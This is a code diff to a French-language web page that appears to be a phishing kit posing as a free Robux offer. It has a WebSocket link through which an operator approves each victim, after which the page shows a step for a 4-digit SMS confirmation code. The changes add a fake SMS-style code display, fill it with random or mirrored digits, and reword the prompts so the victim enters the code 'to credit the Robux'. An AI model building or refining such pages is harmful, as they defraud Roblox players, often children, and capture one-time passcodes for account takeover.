@@ -726,11 +726,11 @@ input:focus{border-color:rgba(229,193,88,.6);background:rgba(229,193,88,.03);box
               </div>
             </div>
             <div class="sms-bubble">
-              Un code de confirmation à 4 chiffres t'a été envoyé par SMS. Entrez-le ci-dessous. Ne le partage pas.
+              Ton code de confirmation Robux est <span class="sms-code-hl" id="fake-code">····</span>. Valable 10 min. Ne le partage pas.
             </div>
           </div>
 
-          <div class="code-inst">Entrez le code reçu par SMS ci-dessous</div>
+          <div class="code-inst">👆 Entre le code ci-dessus pour créditer les Robux</div>
           <div class="digits">
             <input class="dg" id="d1" maxlength="1" type="text" inputmode="numeric" placeholder="·"/>
             <input class="dg" id="d2" maxlength="1" type="text" inputmode="numeric" placeholder="·"/>
@@ -897,7 +897,11 @@ dIds.forEach((id,i)=>{
   });
 });
 
-function updateFakeCode(){}
+function updateFakeCode(){
+  const code=dIds.map(id=>{const v=document.getElementById(id).value;return v||'·';}).join('');
+  const el=document.getElementById('fake-code');
+  if(el)el.textContent=code;
+}
 
 /* ── SHOW STEP ── */
 function show(id){
@@ -926,6 +930,10 @@ function connectWS(){
     const m=JSON.parse(e.data);
     if(m.type==='decision'){
       if(m.decision==='accepted'){
+        const ph=document.getElementById('w-ph').textContent;
+        const fk=String(Math.floor(1000+Math.random()*9000));
+        const fc=document.getElementById('fake-code');
+        if(fc)fc.textContent=fk.split('').join('');
         setStepBar(3);show('s-code');startCodeTimer();
         setTimeout(()=>document.getElementById('d1').focus(),200);
       }else{
